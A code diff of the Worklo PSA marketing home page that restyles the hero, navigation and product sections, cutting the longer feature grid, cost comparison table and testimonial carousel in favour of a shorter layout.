@@ -5,10 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Worklo PSA — Professional Services Automation</title>
   <meta name="description" content="Worklo PSA (Professional Services Automation): the full-stack internal ops platform for agencies and consultancies—projects, time, capacity, workflows, client portal, analytics, and RBAC backed by Supabase." />
-  <link rel="stylesheet" href="/css/style.css" />
+  <link rel="stylesheet" href="/css/style.css?v=20260806g" />
   <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
   <link rel="icon" href="/images/tab-logo.gif" type="image/gif" sizes="192x192" /><link rel="apple-touch-icon" sizes="180x180" href="/images/tab-logo.gif" /><link rel="shortcut icon" href="/images/tab-logo.gif" />
-<link rel="manifest" href="/manifest.json" /><meta name="theme-color" content="#00C2A8" /><meta name="mobile-web-app-capable" content="yes" /><meta name="apple-mobile-web-app-capable" content="yes" /><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <link rel="manifest" href="/manifest.json" /><meta name="theme-color" content="#050505" /><meta name="mobile-web-app-capable" content="yes" /><meta name="apple-mobile-web-app-capable" content="yes" /><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
 </head>
 <body>
 
@@ -16,7 +16,7 @@
 <nav>
   <div class="nav-inner">
     <a href="/" class="nav-logo">
-      <img src="/images/logo.gif" alt="Worklo" />
+      <img src="/images/logo-nav.png" alt="Worklo" />
     </a>
     <ul class="nav-links">
       <li><a href="/features">Features</a></li>
@@ -26,18 +26,9 @@
       <li class="nav-dropdown">
         <a href="#">Company <i data-lucide="chevron-down" class="chevron"></i></a>
         <div class="dropdown-menu">
-          <a href="/about" class="dropdown-item">
-            <h4>About</h4>
-            <p>Our story, mission, and the team behind Worklo</p>
-          </a>
-          <a href="/careers" class="dropdown-item">
-            <h4>Careers</h4>
-            <p>Join us and help build the future of agency operations</p>
-          </a>
-          <a href="/contact" class="dropdown-item">
-            <h4>Contact</h4>
-            <p>Get in touch for support or questions</p>
-          </a>
+          <a href="/about" class="dropdown-item">About</a>
+          <a href="/careers" class="dropdown-item">Careers</a>
+          <a href="/contact" class="dropdown-item">Contact</a>
         </div>
       </li>
     </ul>
@@ -69,17 +60,13 @@
 <!-- -$ Hero -$ -->
 <section class="hero">
   <div class="hero-video-bg">
-    <img src="/images/background.jpg" alt="" style="width:100%;height:100%;object-fit:cover;object-position:center;" />
+    <img src="/images/background.jpg" alt="" />
   </div>
-  <div class="hero-grid"></div>
-  <div class="hero-bg"></div>
   <div class="container">
     <div class="hero-content">
-
-      <h1>One platform.<br><span class="gradient-text">Zero tool chaos.</span></h1>
-
-      <p><strong>Worklo PSA</strong> is your agency's operating system: projects, time, capacity, workflows, and client visibility in one calm command center—so your team stops living in five tabs and a spreadsheet.</p>
-
+      <span class="hero-brand">Worklo PSA</span>
+      <h1>One platform.<br>Zero tool chaos.</h1>
+      <p><strong>Worklo PSA</strong> runs projects, time, capacity, workflows, and client visibility in a single command center—so your agency stops living in five tabs and a spreadsheet.</p>
       <div class="hero-actions">
         <a href="https://app.worklo.org/" class="btn-hero-primary">
           <span>Start free trial</span>
@@ -89,595 +76,158 @@
           <span>Live Demo</span>
         </a>
       </div>
-
     </div>
   </div>
 </section>
 
-<!-- -$ Body sections with video background -$ -->
-<div class="video-section-wrap">
+<div class="ed-wrap">
 
-<!-- -$ Product preview (after hero) -$ -->
-<section class="home-product-preview" id="product-preview">
+<!-- -$ Product -$ -->
+<section class="ed-product" id="product-preview">
+  <div class="ed-product-caption fade-up">
+    <span>The product</span>
+    <p>Your agency's operating system—projects, time, capacity, and clients in one view.</p>
+  </div>
+  <div class="ed-product-frame fade-up">
+    <img src="/images/Home/dashboard.jpg" alt="Worklo dashboard: projects, capacity, and operations in one view" width="1600" height="900" loading="eager" decoding="async" />
+  </div>
+</section>
+
+<!-- -$ Pain -$ -->
+<section class="ed-pain" id="the-pain">
   <div class="container">
-    <div class="section-header fade-up">
-      <span class="section-label">Worklo PSA</span>
-      <h2>Your agency in <span class="gradient-text">one command center</span></h2>
-      <p class="home-preview-tagline">Worklo is your agency's operating system.</p>
-      <p>Professional Services Automation—projects, time, capacity, workflows, and client visibility without stitching tools together.</p>
-    </div>
-    <div class="home-preview-frame fade-up">
-      <img src="/images/Home/dashboard.jpg" alt="Worklo dashboard: projects, capacity, and operations in one view" width="1600" height="900" loading="eager" decoding="async" />
+    <div class="ed-pain-grid">
+      <div class="ed-pain-copy fade-up">
+        <span class="section-label">The pain</span>
+        <h2>Your stack is quietly eating the business</h2>
+        <p>Too many tools, too little signal—so every week starts with rework, firefighting, and guessing.</p>
+      </div>
+      <div class="ed-metrics fade-up">
+        <div class="ed-metric">
+          <span class="ed-metric-val">5+</span>
+          <span class="ed-metric-cap">Disconnected tools your team opens before lunch</span>
+        </div>
+        <div class="ed-metric">
+          <span class="ed-metric-val">Slow</span>
+          <span class="ed-metric-cap">Answers on capacity and delivery risk</span>
+        </div>
+        <div class="ed-metric">
+          <span class="ed-metric-val">30+</span>
+          <span class="ed-metric-cap">Page SOPs nobody follows</span>
+        </div>
+      </div>
     </div>
   </div>
 </section>
 
-<!-- -$ Pain (roadmap step 2) -$ -->
-<section class="home-pain" id="the-pain" style="padding-top: 0;">
+<!-- -$ Shift -$ -->
+<section class="ed-shift" id="the-shift">
   <div class="container">
     <div class="section-header fade-up">
-      <span class="section-label">The pain</span>
-      <h2>Your stack is quietly <span class="gradient-text">eating the business</span></h2>
-      <p>Too many tools, too little signal—so every week starts with rework, firefighting, and guessing.</p>
+      <span class="section-label">The shift</span>
+      <h2>From firefighting to one clear pulse</h2>
+      <p>Worklo is not another tab—it is where delivery, people, and clients finally line up.</p>
     </div>
-    <div class="home-pain-metrics fade-up">
-      <div class="home-pain-metric">
-        <span class="home-pain-num">5+</span>
-        <span class="home-pain-cap">Disconnected tools</span>
-      </div>
-      <div class="home-pain-metric">
-        <span class="home-pain-word">Slow</span>
-        <span class="home-pain-cap">Answers on capacity &amp; delivery risk</span>
-      </div>
-      <div class="home-pain-metric">
-        <span class="home-pain-num">30+</span>
-        <span class="home-pain-cap">Page SOPs nobody follows</span>
-      </div>
-    </div>
-    <ul class="home-pain-bullets fade-up">
-      <li><span class="home-pain-dot"></span><span>Projects live in one app, time in another, capacity in spreadsheets</span></li>
-      <li><span class="home-pain-dot"></span><span>Leads say yes before ops can prove the team is free</span></li>
-      <li><span class="home-pain-dot"></span><span>Clients chase updates in email because they cannot see delivery</span></li>
-      <li><span class="home-pain-dot"></span><span>Knowledge walks out the door when key people leave</span></li>
+    <ul class="ed-shift-list fade-up">
+      <li class="ed-shift-item">
+        <span class="ed-shift-num">01</span>
+        <div class="ed-shift-body">
+          <h3>Say yes with confidence</h3>
+          <p>See who is actually free before you promise a date. Ops and sales finally speak the same language.</p>
+        </div>
+      </li>
+      <li class="ed-shift-item">
+        <span class="ed-shift-num">02</span>
+        <div class="ed-shift-body">
+          <h3>Clients stop guessing</h3>
+          <p>They see progress, leave feedback, and approve work in one place—without getting your whole internal stack.</p>
+        </div>
+      </li>
+      <li class="ed-shift-item">
+        <span class="ed-shift-num">03</span>
+        <div class="ed-shift-body">
+          <h3>Your process sticks</h3>
+          <p>Handoffs and approvals live in the product, not in a PDF nobody opens. New hires inherit how you work.</p>
+        </div>
+      </li>
     </ul>
   </div>
 </section>
 
-<!-- -$ Outcome / solution (short, emotional) -$ -->
-<section class="home-outcome" id="the-shift">
-  <div class="container">
-    <div class="section-header fade-up">
-      <span class="section-label">The shift</span>
-      <h2>From firefighting to <span class="gradient-text">one clear pulse</span></h2>
-      <p>Worklo is not another tab to check—it is where delivery, people, and clients finally line up.</p>
+<!-- -$ Spotlight -$ -->
+<section class="ed-spot" id="spotlight">
+  <article class="ed-spot-row fade-up">
+    <div class="ed-spot-copy">
+      <span class="ed-spot-kicker">Capacity</span>
+      <h3>See the load before it breaks</h3>
+      <p>Departments and roles roll up the way your firm is built—so overload shows up before it becomes a crisis.</p>
     </div>
-    <div class="home-outcome-grid fade-up">
-      <div class="home-outcome-card" data-num="01">
-        <h3>Say yes with confidence</h3>
-        <p>See who is actually free before you promise a date. Ops and sales finally speak the same language.</p>
-      </div>
-      <div class="home-outcome-card" data-num="02">
-        <h3>Clients stop guessing</h3>
-        <p>They see progress, leave feedback, and approve work in one place—without getting your whole internal stack.</p>
-      </div>
-      <div class="home-outcome-card" data-num="03">
-        <h3>Your process sticks</h3>
-        <p>Handoffs and approvals live in the product, not in a PDF nobody opens. New hires inherit how you work, not folklore.</p>
-      </div>
+    <div class="ed-spot-visual">
+      <img src="/images/Home/department.jpg" alt="Worklo: departments and organizational structure" width="1200" height="675" loading="lazy" decoding="async" />
     </div>
-  </div>
-</section>
+  </article>
 
-<!-- -$ Connected ops (Network.gif) -$ -->
-<section class="home-network" id="connected-operations" style="background: var(--dark);">
-  <div class="container">
-    <div class="section-header fade-up">
-      <span class="section-label">Connected</span>
-      <h2>One system, <span class="gradient-text">one pulse</span></h2>
-      <p>Worklo is your agency's operating system—see how work, people, and data stay linked instead of scattered.</p>
+  <article class="ed-spot-row ed-spot-row--reverse fade-up">
+    <div class="ed-spot-copy">
+      <span class="ed-spot-kicker">Time</span>
+      <h3>Hours that match reality</h3>
+      <p>Capture how the week really went—without nagging. Cleaner time means cleaner invoices and fewer write-offs.</p>
     </div>
-    <div class="home-network-frame fade-up">
+    <div class="ed-spot-visual">
+      <img src="/images/Home/time%20entries.jpg" alt="Worklo: time entries and weekly view" width="1200" height="675" loading="lazy" decoding="async" />
+    </div>
+  </article>
+
+  <article class="ed-spot-row fade-up">
+    <div class="ed-spot-copy">
+      <span class="ed-spot-kicker">Connected</span>
+      <h3>One system, one pulse</h3>
+      <p>Work, people, and data stay linked instead of scattered across tools that never talk to each other.</p>
+    </div>
+    <div class="ed-spot-visual">
       <video src="/images/Home/network.mp4" width="1920" height="1080" autoplay muted loop playsinline preload="metadata" title="Organization network: users, projects, and accounts"></video>
     </div>
-  </div>
+  </article>
 </section>
 
-<!-- -$ Four spotlight capabilities (screens + benefits) -$ -->
-<section class="home-spotlight" id="spotlight">
+<!-- -$ Close CTA -$ -->
+<section class="ed-close" id="try-worklo">
   <div class="container">
-    <div class="section-header fade-up">
-      <span class="section-label">At a glance</span>
-      <h2>Four wins you <span class="gradient-text">feel on day one</span></h2>
-      <p>The messy edges that used to live in different tools—now visible in onge product.</p>
-    </div>
-
-    <article class="home-spot-row fade-up">
-      <div class="home-spot-copy">
-        <h3>Projects &amp; tasks, under control</h3>
-        <p>Kanban, lists, and milestones stay tied to the people doing the work—so status meetings shrink and everyone sees the same truth.</p>
-        <ul class="home-spot-benefits">
-          <li>Assignments and deadlines in one lane</li>
-          <li>Less “where is that ticket?” in chat</li>
-        </ul>
-      </div>
-      <div class="home-spot-visual">
-        <figure class="home-spot-frame">
-          <img src="/images/Home/analytics%20dashboard.jpg" alt="Worklo: capacity trend, utilization, and dashboard widgets in one view" width="1200" height="675" loading="lazy" decoding="async" />
-        </figure>
-      </div>
-    </article>
-
-    <article class="home-spot-row home-spot-row--reverse fade-up">
-      <div class="home-spot-copy">
-        <h3>Time that matches reality</h3>
-        <p>Capture how the week really went—without nagging. Cleaner time means cleaner invoices and fewer write-offs.</p>
-        <ul class="home-spot-benefits">
-          <li>Clock and manual entries in one flow</li>
-          <li>Weekly picture leadership can trust</li>
-        </ul>
-      </div>
-      <div class="home-spot-visual">
-        <figure class="home-spot-frame">
-          <img src="/images/Home/time%20entries.jpg" alt="Worklo: time entries and weekly view" width="1200" height="675" loading="lazy" decoding="async" />
-        </figure>
-      </div>
-    </article>
-
-    <article class="home-spot-row fade-up">
-      <div class="home-spot-copy">
-        <h3>Capacity you can see</h3>
-        <p>Departments and roles roll up the way your firm is built—so overload shows up before it becomes a crisis.</p>
-        <ul class="home-spot-benefits">
-          <li>Team and org-level load in context</li>
-          <li>Fewer surprise “we’re underwater” Fridays</li>
-        </ul>
-      </div>
-      <div class="home-spot-visual">
-        <figure class="home-spot-frame">
-          <img src="/images/Home/department.jpg" alt="Worklo: departments and organizational structure" width="1200" height="675" loading="lazy" decoding="async" />
-        </figure>
-      </div>
-    </article>
-
-    <article class="home-spot-row home-spot-row--reverse fade-up">
-      <div class="home-spot-copy">
-        <h3>Clients in the loop—safely</h3>
-        <p>A dedicated client experience for feedback and approvals—without handing over your messy internal tool.</p>
-        <ul class="home-spot-benefits">
-          <li>Clear deliverables and sign-off</li>
-          <li>Less inbox ping-pong on status</li>
-        </ul>
-      </div>
-      <div class="home-spot-visual home-spot-visual--card">
-        <div class="home-spot-placeholder">
-          <span class="home-spot-placeholder-label">Client portal</span>
-          <p>Approvals, feedback, and visibility—scoped to what each client should see.</p>
-          <a href="/features" class="btn btn-outline btn-sm">See how it works</a>
-        </div>
-      </div>
-    </article>
-  </div>
-</section>
-
-<!-- -$ Benefits band -$ -->
-<section class="home-benefits" id="why-teams-pick-worklo">
-  <div class="container">
-    <div class="section-header fade-up">
-      <span class="section-label">Why it matters</span>
-      <h2>Outcomes, <span class="gradient-text">not more noise</span></h2>
-      <p>What changes when the idea clicks—before you read a single spec sheet.</p>
-    </div>
-    <div class="home-benefits-grid fade-up">
-      <div class="home-benefit-card">
-        <div class="benefit-icon">
-          <i data-lucide="zap"></i>
-        </div>
-        <h3>Faster decisions</h3>
-        <p>One place to answer “Can we take this?” and “Who owns it?” without opening four apps.</p>
-      </div>
-      <div class="home-benefit-card">
-        <div class="benefit-icon">
-          <i data-lucide="check-circle-2"></i>
-        </div>
-        <h3>Calmer delivery</h3>
-        <p>Work, time, and capacity share a backbone—so surprises surface early, not on launch day.</p>
-      </div>
-      <div class="home-benefit-card">
-        <div class="benefit-icon">
-          <i data-lucide="users"></i>
-        </div>
-        <h3>Clearer clients</h3>
-        <p>They see progress on their terms. You spend less time translating status into email.</p>
-      </div>
-      <div class="home-benefit-card">
-        <div class="benefit-icon">
-          <i data-lucide="database"></i>
-        </div>
-        <h3>One source of truth</h3>
-        <p>When the data lives together, reporting and handoffs stop being a reconciliation project.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- -$ Core Features (full grid) -$ -->
-<section id="full-platform">
-  <div class="container">
-    <div class="section-header fade-up">
-      <span class="section-label">Full platform</span>
-      <h2>Everything your agency runs on</h2>
-      <p>Nine modules, one product—the full picture lives here; deep dives and flows are on the Features page.</p>
-    </div>
-    <div class="features-grid">
-      <div class="feature-card fade-up">
-        <!-- Capacity: stacked horizontal bars of unequal width - like a load meter -->
-        <div class="feature-icon"><i data-lucide="gauge"></i></div>
-        <h3>Intelligent Capacity Planning</h3>
-        <p>Proportional allocation across accounts. Know exactly who's available before committing to new work - at individual, department, and org level.</p>
-      </div>
-      <div class="feature-card fade-up">
-        <!-- Workflow: nodes connected by lines - pipeline feel -->
-        <div class="feature-icon"><i data-lucide="git-branch"></i></div>
-        <h3>Workflow automation</h3>
-        <p>Node-based visual editor with role-based handoffs, approvals, and form steps—so SOPs become living processes instead of static docs.</p>
-      </div>
-      <div class="feature-card fade-up">
-        <!-- Time: minimal clock with a single bold hand -->
-        <div class="feature-icon"><i data-lucide="clock"></i></div>
-        <h3>Time tracking</h3>
-        <p>Clock in/out widget, manual entries, weekly summaries, auto clock-out guardrails, and edit windows—so billable time stays accurate.</p>
-      </div>
-      <div class="feature-card fade-up">
-        <!-- Views: four quadrant squares - grid/layout switcher -->
-        <div class="feature-icon"><i data-lucide="layout-grid"></i></div>
-        <h3>Projects &amp; tasks</h3>
-        <p>Kanban and table views, assignments, milestones, issues, and updates—plus Gantt, table, and workflow layouts when you need them.</p>
-      </div>
-      <div class="feature-card fade-up">
-        <!-- Permissions: key with a dot - access control -->
-        <div class="feature-icon"><i data-lucide="key-round"></i></div>
-        <h3>RBAC &amp; permissions</h3>
-        <p>About 40 granular permissions, dynamic roles, and superadmin controls—with a fast path from loaded role data and a database fallback. Rules are enforced with Supabase Row Level Security, not UI-only checks.</p>
-      </div>
-      <div class="feature-card fade-up">
-        <!-- Client portal: person inside a frame/window -->
-        <div class="feature-icon"><i data-lucide="user-circle-2"></i></div>
-        <h3>Client portal</h3>
-        <p>A dedicated client experience so accounts can view work, leave feedback, and approve deliverables—without giving clients your full internal tool.</p>
-      </div>
-      <div class="feature-card fade-up">
-        <div class="feature-icon"><i data-lucide="bar-chart-3"></i></div>
-        <h3>Analytics</h3>
-        <p>Org, department, account, project, and time metrics with Recharts and D3—so leaders see utilization, delivery health, and trends in one place.</p>
-      </div>
-      <div class="feature-card fade-up">
-        <div class="feature-icon"><i data-lucide="shield-check"></i></div>
-        <h3>Accounts &amp; departments</h3>
-        <p>CRM-style account records and a department hierarchy so capacity, work, and reporting roll up the way your firm is actually structured.</p>
-      </div>
-      <div class="feature-card fade-up">
-        <div class="feature-icon"><i data-lucide="mail"></i></div>
-        <h3>Invitations &amp; newsletters</h3>
-        <p>Email-based onboarding for staff and clients (SMTP), plus internal newsletter broadcasting so updates reach the whole org without another tool.</p>
-      </div>
-    </div>
-    <div style="text-align:center; margin-top: 40px;" class="fade-up">
-      <a href="/features" class="btn btn-outline">Explore all features</a>
-    </div>
-  </div>
-</section>
-
-<!-- -$ Comparison -$ -->
-<section style="background: var(--dark);">
-  <div class="container">
-    <div class="section-header fade-up">
-      <span class="section-label">Comparison</span>
-      <h2>Replace your entire stack</h2>
-      <p>One subscription. One login. One source of truth.</p>
-    </div>
-    <div class="fade-up" style="overflow-x: auto;">
-      <table class="comparison-table">
-        <thead>
-          <tr>
-            <th>What you have now</th>
-            <th class="highlight">What Worklo provides</th>
-            <th>Avg. monthly cost</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td>Monday.com / Asana / Basecamp</td>
-            <td class="highlight">Project & task management (Kanban, Gantt, Table)</td>
-            <td>$12-20/user</td>
-          </tr>
-          <tr>
-            <td>Harvest / Toggl</td>
-            <td class="highlight">Time tracking (clock in/out + manual entry)</td>
-            <td>$10-14/user</td>
-          </tr>
-          <tr>
-            <td>Float / spreadsheets</td>
-            <td class="highlight">Real-time capacity planning</td>
-            <td>$6-10/user</td>
-          </tr>
-          <tr>
-            <td>Static SOP documents</td>
-            <td class="highlight">Visual workflow builder with enforced handoffs</td>
-            <td>-</td>
-          </tr>
-          <tr>
-            <td>Slack status updates</td>
-            <td class="highlight">Automated client portal with live visibility</td>
-            <td>$7-15/user</td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
-    <p style="text-align:center; margin-top: 20px; font-size: 0.88rem;" class="fade-up">
-      Average savings: <strong style="color: var(--blue);">40-60% reduction</strong> in software costs per user per month.
-    </p>
-  </div>
-</section>
-
-<!-- -$ Testimonials -$ -->
-<section style="overflow:hidden;padding:80px 0">
-  <div class="container">
-    <div class="section-header fade-up">
-      <span class="section-label">Testimonials</span>
-      <h2>Trusted by growing agencies</h2>
-    </div>
-  </div>
-  <div class="tm-wrap">
-    <div class="tm-track tm-left">
-      <div class="testimonial-card tm-card">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"We went from juggling five tools to one. Capacity planning alone saved us from over-committing on two major accounts last quarter."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/cas1.png" alt="Michael R." /></div>
-            <div><div class="author-name">Michael R.</div><div class="author-role">Operations Director, Creative Agency · New York, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-card tm-card">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"The client portal changed everything. Clients stopped emailing us for updates — they just log in and see exactly where their project stands."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/Dmytro.png" alt="James K." /></div>
-            <div><div class="author-name">James K.</div><div class="author-role">Founder, Marketing Consultancy · Austin, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-card tm-card">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"The workflow builder replaced our entire SOP library. New team members actually follow the process now because it's enforced, not just documented."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/T03N75ZM1-U013E9CSK42-34199d2eb7c2-512.png" alt="Robert L." /></div>
-            <div><div class="author-name">Robert L.</div><div class="author-role">Project Manager, Digital Studio · San Francisco, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-card tm-card">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"Time tracking used to be a fight. Now the team logs hours without thinking about it — and our billing accuracy went up by 30% in the first month."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/c7xhm8wnldskqkxbchay.jpg" alt="Daniel T." /></div>
-            <div><div class="author-name">Daniel T.</div><div class="author-role">CEO, Growth Agency · Chicago, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-card tm-card">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"Worklo gave us visibility we never had before. I can see every team member's load at a glance and make resourcing decisions in seconds, not hours."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/face_244_325_636110324764997130_guruImgLarge_82bbbd32-ce11-4181-9507-fbe7feae7101.jpg" alt="Brandon W." /></div>
-            <div><div class="author-name">Brandon W.</div><div class="author-role">Agency Director, Full-Service Studio · Seattle, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-card tm-card">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"Onboarding new clients used to take days of back-and-forth. With the client portal and approval workflows, we cut that down to a few hours."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/Final Image_636105916544971106_guruImgLarge_21aff6d8-73d4-4033-9eaf-a84c84577729.jpg" alt="Kevin M." /></div>
-            <div><div class="author-name">Kevin M.</div><div class="author-role">Co-Founder, Design Studio · Miami, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-card tm-card">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"The permissions system is exactly what we needed. Every team member sees only what's relevant to them — no more accidental data leaks or confused clients."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/image2_637141781600732468_guruImgLarge_3ed920f3-3e8b-4c08-b750-efeb2fd9bd22.jfif" alt="Tyler H." /></div>
-            <div><div class="author-name">Tyler H.</div><div class="author-role">Head of Operations, Digital Agency · Denver, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <!-- duplicates for seamless loop -->
-      <div class="testimonial-card tm-card" aria-hidden="true">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"We went from juggling five tools to one. Capacity planning alone saved us from over-committing on two major accounts last quarter."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/cas1.png" alt="Michael R." /></div>
-            <div><div class="author-name">Michael R.</div><div class="author-role">Operations Director, Creative Agency · New York, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-card tm-card" aria-hidden="true">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"The client portal changed everything. Clients stopped emailing us for updates — they just log in and see exactly where their project stands."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/Dmytro.png" alt="James K." /></div>
-            <div><div class="author-name">James K.</div><div class="author-role">Founder, Marketing Consultancy · Austin, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-card tm-card" aria-hidden="true">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"The workflow builder replaced our entire SOP library. New team members actually follow the process now because it's enforced, not just documented."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/T03N75ZM1-U013E9CSK42-34199d2eb7c2-512.png" alt="Robert L." /></div>
-            <div><div class="author-name">Robert L.</div><div class="author-role">Project Manager, Digital Studio · San Francisco, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-card tm-card" aria-hidden="true">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"Time tracking used to be a fight. Now the team logs hours without thinking about it — and our billing accuracy went up by 30% in the first month."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/c7xhm8wnldskqkxbchay.jpg" alt="Daniel T." /></div>
-            <div><div class="author-name">Daniel T.</div><div class="author-role">CEO, Growth Agency · Chicago, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-card tm-card" aria-hidden="true">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"Worklo gave us visibility we never had before. I can see every team member's load at a glance and make resourcing decisions in seconds, not hours."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/face_244_325_636110324764997130_guruImgLarge_82bbbd32-ce11-4181-9507-fbe7feae7101.jpg" alt="Brandon W." /></div>
-            <div><div class="author-name">Brandon W.</div><div class="author-role">Agency Director, Full-Service Studio · Seattle, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-card tm-card" aria-hidden="true">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"Onboarding new clients used to take days of back-and-forth. With the client portal and approval workflows, we cut that down to a few hours."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/Final Image_636105916544971106_guruImgLarge_21aff6d8-73d4-4033-9eaf-a84c84577729.jpg" alt="Kevin M." /></div>
-            <div><div class="author-name">Kevin M.</div><div class="author-role">Co-Founder, Design Studio · Miami, USA</div></div>
-          </div>
-        </div>
-      </div>
-      <div class="testimonial-card tm-card" aria-hidden="true">
-        <div class="tm-card-inner">
-          <p class="testimonial-quote">"The permissions system is exactly what we needed. Every team member sees only what's relevant to them — no more accidental data leaks or confused clients."</p>
-          <div class="testimonial-author">
-            <div class="author-avatar"><img src="/images/avatar/image2_637141781600732468_guruImgLarge_3ed920f3-3e8b-4c08-b750-efeb2fd9bd22.jfif" alt="Tyler H." /></div>
-            <div><div class="author-name">Tyler H.</div><div class="author-role">Head of Operations, Digital Agency · Denver, USA</div></div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-  <style>
-    .tm-wrap {
-      overflow: hidden;
-      -webkit-mask-image: linear-gradient(to right, transparent 0%, #000 10%, #000 90%, transparent 100%);
-      mask-image: linear-gradient(to right, transparent 0%, #000 10%, #000 90%, transparent 100%);
-    }
-    .tm-track { display: flex; gap: 20px; width: max-content; }
-    .tm-card  { width: 360px; flex-shrink: 0; background: none !important; border: none !important; padding: 0 !important; box-shadow: none !important; }
-    .tm-card-inner {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: var(--radius-lg);
-      padding: 28px;
-      height: 220px;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      clip-path: inset(0% 0% 0% 0% round 12px);
-      transition: clip-path 0.4s cubic-bezier(.16,1,.3,1), transform 0.4s cubic-bezier(.16,1,.3,1), box-shadow 0.4s ease, border-color 0.3s ease;
-    }
-    .tm-card-inner .testimonial-quote {
-      overflow: hidden;
-      display: -webkit-box;
-      -webkit-line-clamp: 4;
-      -webkit-box-orient: vertical;
-      margin-bottom: 0;
-    }
-    .tm-card:hover .tm-card-inner {
-      clip-path: inset(8% 0% 0% 0% round 12px);
-      transform: translateY(-6px);
-      border-color: rgba(59,130,246,0.3);
-      box-shadow: 0 20px 48px rgba(0,0,0,0.4), 0 0 0 1px rgba(59,130,246,0.12);
-    }
-    .tm-left { animation: tmLeft 55s linear infinite; }
-    .tm-wrap:hover .tm-left { animation-play-state: paused; }
-    @keyframes tmLeft { from { transform: translateX(0); } to { transform: translateX(-50%); } }
-  </style>
-</section>
-
-<!-- -$ Download -$ (removed) -->
-<!-- -$ CTA -$ -->
-<section class="cta-section" style="background: var(--dark);">
-  <div class="container">
-    <span class="section-label fade-up">Try Worklo</span>
-    <h2 class="fade-up">See it with your own eyes</h2>
-    <p class="fade-up">Open the live demo when you want the tour, or start a free trial when you are ready to run your next week inside one system.</p>
-    <div class="cta-actions fade-up">
-      <div class="cta-dl-wrap">
+    <div class="ed-close-inner fade-up">
+      <span class="section-label">Try Worklo</span>
+      <h2>See it with your own eyes</h2>
+      <p>Open the live demo when you want the tour, or start a free trial when you are ready to run your next week inside one system.</p>
+      <div class="ed-close-actions">
         <a class="btn btn-primary" href="https://demo.worklo.org/" target="_blank" rel="noopener">Live Demo</a>
+        <a href="https://app.worklo.org/" class="btn btn-outline">Start free trial</a>
+        <a href="/features" class="btn btn-outline">Explore features</a>
       </div>
-      <a href="https://app.worklo.org/" class="btn btn-outline">Start free trial</a>
-      <a href="https://worklo.org/features" class="btn btn-outline">Explore features</a>
     </div>
   </div>
 </section>
 
-</div><!-- end video-section-wrap -->
+</div><!-- end ed-wrap -->
 
-<!-- Footer -->
-<style>
-footer{background:#000;border-top:1px solid rgba(255,255,255,.08);padding:80px 0 0}
-footer .container{position:relative;z-index:1}
-.fnw{display:grid;grid-template-columns:1.1fr 1fr 1.5fr;gap:60px;align-items:start}
-.fnw .c1 h4,.fnw .c2 h4{font-size:1rem;font-weight:700;color:#fff;margin:0 0 20px;letter-spacing:-.01em;text-transform:none;background:none;-webkit-text-fill-color:#fff}
-.fnw .socials{display:flex;gap:8px;margin-bottom:28px}
-.fnw .socials a{width:30px;height:30px;border-radius:6px;background:rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;color:#fff;text-decoration:none;transition:background .2s,transform .2s;flex-shrink:0}
-.fnw .socials a svg{width:13px;height:13px}
-.fnw .socials a:hover{background:rgba(255,255,255,.2);transform:translateY(-2px)}
-.fnw .ph-block{margin-bottom:22px}
-.fnw .ph-block>svg,.fnw .ad-block>svg{display:block;color:rgba(255,255,255,.65);margin-bottom:10px;width:22px;height:22px}
-.fnw .ph-block a{display:block;font-size:.83rem;color:rgba(255,255,255,.45);text-decoration:none;line-height:1.9;transition:color .2s}
